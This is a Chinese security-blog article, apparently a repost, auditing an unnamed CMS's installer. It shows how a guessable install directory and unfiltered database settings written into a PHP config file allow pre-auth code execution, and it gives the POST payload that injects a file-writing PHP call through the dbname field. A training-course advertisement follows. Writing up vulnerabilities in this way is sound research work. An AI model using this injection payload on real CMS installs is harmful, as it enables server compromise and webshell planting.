---
title: 某CMS最新版本前台RCE审计流程
url: https://mp.weixin.qq.com/s/k27h7AAfms33bBqnFOkmsA
source: Doonsec's feed
date: 2026-05-06
fetch_date: 2026-05-07T05:33:06.837131
---

# 某CMS最新版本前台RCE审计流程

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kTFY7Wl1Qa1JcCEr6L44vwMJcqpwPicBPPhWJDjsof5FnqiadIpTyLIOCvBEKBGhSRI9xTLgREOK8vVVNz3MemL5miciaiaXBgJIPRg/0?wx_fmt=jpeg)

# 某CMS最新版本前台RCE审计流程

威零安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于进击安全
，作者学员投稿

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4Eu4ArzE5xKh7ouSAzvohwFkvzPibNQxs6X4k2SxgCvBA/0)

**进击安全**
.

主要分享一些个人实战经验，以及漏洞复现，代码审计，等等方面的文章，欢迎大家关注我的公众号呀，可以投稿哦，有稿费的哦，菜鸟路过～～～

# 现在只对常读和星标的公众号才展示大图推送，建议大家能把**威零安全团队**“**设为星标**”，否则可能就看不到了啦！ ![](https://mmbiz.qpic.cn/mmbiz_png/DlIbJNHXhc1pC40KxSpjPOq2S0fHe2qPiaFvQ8pRogV5MEXG7q82OdZTUzic2vEOV4NfUpnHYdXQPhnYbdibctq0Q/640?wx_fmt=png&from=appmsg) 免责声明 本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。 由于传播、利用本公众号所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担。威零安全实验室公众号及原文章作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

一、前言

跟着小朋友老师学习了一段时间代码审计，这里将其中审计出来的一个漏洞给小朋友师傅分享出来。

二、漏洞审计&复现

首先进行环境搭建。

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSuMcgZvFLwiatveLksDVcMfQ2Cn0icxdARPBhHyAgex0S0iazyuyico1g0Ns10uHXRNqLKfFrlvvPvfhiaZIZc5iatSR3CBRNAmWU0I/640?wx_fmt=png&from=appmsg)

可以看到，后台路径其实是admin+四位数字\install\index.php。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kSSpXmwzKp0mNN5w9lLJrqZgMx44HV0WVS3cyxVriboiausRzncFF73nnKT0Oicek0oDPNeicp2ClSt5F8Tyia5CbmndWwYK94Gj8KU/640?wx_fmt=jpeg)

同时，我们到\install\step\step5.php看下

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kScSU9wmPiaukaMRMTI0Zia0DX1u3ibtqq5w5yKAR0COmickkWRvSsEKyemrXXkXEqY1bib369Ozqd2jPUsS28oL4AjeyyGBm7uJkr0/640?wx_fmt=png&from=appmsg)

这里请求了重命名安装目录的函数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTygBc1j6VNA39tmLDZxqPkBJDs8ibtibFkgzNOCnXIwJ4U7rMFiazwzPrOMRO3hr6y7r7zy1uOptz7eZzrfjib1oTV6ic91hquicIYw/640?wx_fmt=png&from=appmsg)

createNonceStr函数实现

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTayAvZvuAED3AYb0QalibwhHpKdJlzicpEaNBZpEzb6PRDLLaofg2GVleC1DrM7AA37ZChlCdzX4bkrNvbQg1xvV67bjo7Gbkt0/640?wx_fmt=png&from=appmsg)

可以看到，就是install\_xxxx+四位字符(大小写字母/数字)我这里本地是install\_xxxsxtlf。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR6ac8oPvrTicdnFT4V5p8hg1v6dWmcRKKrTdZtAzVkeUYBHtlBF9FnEib0HEFfbnIzR7fdmw3uJnh47n3bS088pFI1q08VYNuHc/640?wx_fmt=png&from=appmsg)

为什么我们要知道安装目录呢？因为，触发漏洞需要这个目录请看\install\installdb.php

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQrIyPju1xIcflNABxiaibC11Ad9MnzpRjYLtZxoibdPFMXs3U1oAGasrQJkhE9xDKdjqCkNZdqxSJDMQ3JKcAXLp6DGVtfrAmuuA/640?wx_fmt=png&from=appmsg)

connDb函数实现。

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRWAp9SrgpugU1roicA8NquZYZjIJwJsfiapmiaspWJ5F844af8R48N6VLP6ZR49mdYjnI6XQ5tF59ALpBLdzibEByiaSKmQFwVkRJw/640?wx_fmt=png&from=appmsg)

发现了吗？可控的mysql服务器设置！这不就可以mysql恶意文件读取了吗，失败了....默认配置是禁用的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kR873nDULAVQeGdA1jxFpoYqDf4qj7kicsTyWr6fItJ5wnBBHefV58DIxg2REa5740tInK0Ric5KxqZDqc4ice7m72x1BveoSia9gc/640?wx_fmt=png&from=appmsg)

但就真的结束了吗？并没有

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRG87CXo2icumibKVVGHknfLjO24s2SP8xEgb0lWXVD1u6MmcyF9ZaCfkJxJMiaasYGedoic2zgu53m1dM5TicsKLdxFM7n4JJaN3GY/640?wx_fmt=png&from=appmsg)

在install\_data分支，我们传入了一系列参数，然后判断是否能正常连接，就进入了try

set\_php\_arr函数实现

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRvLMDcDziciaEbw4HJyJYuR1MQKb7jDHlVjWJ0xE9tBXiaNiaIOqnQ2Xl6wzqiaicyFPqNGTLYmSZ0icVbvvUlWSGsX3CA7YKDDcY3NI/640?wx_fmt=png&from=appmsg)

可以看到没有任何的过滤，就写入文件安装完的网站配置是这样的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTrnnOmic1iaxCWTbz1yb16kPmAorCDhJ2Xp4DGdFKspibwQYRicF7N3ULZZZLYvpuJYLe61l6vMogib94iaOoj5W6gJgZKNRErKSsZo/640?wx_fmt=png&from=appmsg)

所以利用方式很简单，找个正常的数据库连接并写入信息，这里我们最好控制dbname

```
check=install_data&dbhost=127.0.0.1&dbuser=root&dbpwd=root&dbport=3306&dbname=1','a'=>fputs(fopen('1.php','w'),''),'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQFeOR6sUNicU2RvVAiaibiarQxYkYR7JaS8guXjYYnw7Wiav8ZCrBxr8XIcPakkwJwwJUAYfay6JuID1MIIbgvntSNDcIcJhUGA0Y4/640?wx_fmt=png&from=appmsg)

数据库名称记得编辑为payload（一定要能够访问到这个web服务，因为要conn连接，访问不到或者信息不正确无法写入文件）

```
1','a'=>fputs(fopen('1.php','w'),''),'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTarSqX15tcGAf6K04OAsyjWqEAhA0EPMoZVTwAPLKgurF8T3KgIPITdwyrX3SjcSnoCg3u4Dq2HKZuicpATQpIC0fLiarTpXOJM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQicXBcsibjpnbVPO6Okd5xQHQjUQ78kahepvyibwh81aMrNuV8iatO8XibQzrKas1rfDMHD5YXFdia9F0wB3N7jEZx3Ia8w0kxRDicgA/640?wx_fmt=png&from=appmsg)

**代码审计培训介绍&广告区域**

历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

一、往期-第四期课程

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1)

###

### 我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2)

![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

往期-第四期基础课程

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4)

###

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTJgMKP2vbzPT7ykYltbibbZIzdiaef3Ym4fptGKibG6u3micdmG6gV1mVBs0NBgEPjSm7qhOia5uHDR2xHoCPzXfiamxOM7L1TMlqeE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：

掌握代码审计思路、完成0-1、能够独立开始审计项目。

讲解方向如下：

✅ NET代码审计

✅ APP、小程序、WEB逆向

✅ JAVA代码审计

（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）

![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

往期-第四期进阶课程

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8)

###

![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT1CmsXFjVIKAdTKpJNXTX1G1TBMYrnaONBxrIiaPmZdH9VvIHIrVPiakdzBd90e8wANGfgFPEIOfzz5BNicz2h7UIORn54cRgWO8/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=9)

    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**。

所以开启了第四期进阶代码审计课程，课程目的主要为：

✅ 深入理解鉴权

✅ 漏洞组合拳扩大危害

✅ 尝试0-1贴合多数学员完成前台RCE出货

（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）

![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10)

![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11)

往期-第四期-部分学员报喜&课件

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12)

![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT9I111pCwD6ywibOk36QDwtQu1ErsrGUo8cwEKpcsonJtVia5Fcib3VPH9KU2oDaPZaKMlZF6esdjibyplLhONYRGRm6vHcCCvCLU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13)

![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRBAPW3icA8cicb3MaLvqAJN2H2mtv2C1yGH1ibrxpU10aegQvFJfM84VMic13VJbFfvOvVjm86psWGhn14HWWgsLoUjkWpfkqB0mA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18)

![图片](https://mm...